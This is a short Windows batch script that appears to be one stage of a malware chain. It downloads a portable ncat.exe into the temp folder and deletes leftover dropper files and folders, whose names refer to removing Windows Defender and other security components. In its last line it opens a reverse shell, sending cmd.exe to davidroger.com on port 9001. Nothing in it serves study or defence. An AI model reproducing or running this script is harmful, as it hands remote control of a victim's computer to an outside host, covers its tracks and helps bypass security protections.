@echo off


cd %temp%
curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe

where ncat.exe >nul 2>&1
if %errorlevel% NEQ 0 (
    exit
)

del /f /q s.bat
del /f /q a.py
del /f /q asd.bat
del /f /q ddd.vbs
del /f /q expe2.bat
del /f /q expe2.vbs
del /f /q lalala.vbs
del /f /q a.ps1
del /f /q RunDefenderRemover.vbs
del /f /q DefenderRemover.bat

rmdir /s /q Remove_SecurityComp
rmdir /s /q Remove_Defender

ncat.exe davidroger.com 9001 -e cmd.exe
